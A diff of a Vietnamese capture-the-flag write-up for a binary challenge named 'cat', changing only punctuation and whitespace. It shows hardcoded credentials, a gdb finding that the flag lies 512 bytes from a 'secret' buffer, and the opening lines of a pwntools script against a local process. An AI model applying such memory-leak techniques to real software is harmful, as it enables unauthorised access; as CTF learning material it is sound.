@@ -42,14 +42,15 @@
    
    
  **2. Ý tưởng**
-    Sau khi đọc source thì em sẽ nhập KCSC_4dm1n1str4t0r cho username và wh3r3_1s_th3_fl4g cho password
+    Sau khi đọc source thì em sẽ nhập KCSC_4dm1n1str4t0r cho username và wh3r3_1s_th3_fl4g cho password.
     Dùng gdb thì thấy được khoảng cách từ biến flag đến secret là 512 nên sẽ nhập 512 ký tự cho biến secret
     
     
   **3. Viết script**
+  
     from pwn import *
     r = process("./cat")
-    
+
     r.recvuntil("Username: ")
     r.sendline("KCSC_4dm1n1str4t0r")
     r.recvuntil("Password: ")
